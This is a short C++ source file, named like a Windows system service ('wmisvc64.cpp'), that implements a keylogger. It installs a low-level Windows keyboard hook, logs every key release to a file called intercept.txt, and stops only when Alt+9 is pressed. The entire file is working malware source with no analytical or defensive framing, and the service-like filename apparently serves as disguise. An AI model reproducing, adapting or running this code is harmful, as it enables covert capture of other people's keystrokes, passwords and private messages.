/*
 * wmisvc64.cpp
 *
 *  Created on: Jan 2, 2019
 *      Author: andreology
 */
#define _WIN32_WINNT 0x500
#include <fstream>
#include "windows.h"

#pragma comment(lib, "user32.lib")
using namespace std;

//open an output file to use later to store intercepted chars
ofstream out("intercept.txt", ios::out);

//specify a call back proc i.e. code executed when a key is pressed
//key press is up and down event
LRESULT CALLBACK ProcessKB(int ncode, WPARAM event, LPARAM kb)
{

        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)kb;
        //only check one key event
        if (event==WM_KEYUP)
        	out << (char) p->vkCode;
        //ending if statement
        //return associated key board stroke and resume path to target app
        return CallNextHookEx(NULL, ncode, event, kb);
}//ending ProcessKb method


//control logic that supports call back routine
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreviousInstance,
LPSTR lpCmdLine, int nShowCmd)
{

  MSG msg;
  out << " Intercepted keyboard: \n\n";
  //declare hook for keyboard
  HHOOK captest=SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKB, hInstance, 0);
        //tell windows that alt 9 is a hot key
        RegisterHotKey(NULL,1,MOD_ALT,0X39);
        while (GetMessage(&msg, NULL, 0, 0) !=0)
        {  if(msg.message == WM_HOTKEY)
           { UnhookWindowsHookEx(captest);
                out << "\n\nEnd Intercept\n";
                out.close();
                return(0);
           }//ending nested if statement
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }//ending while loop statement
}//ending WinMain method
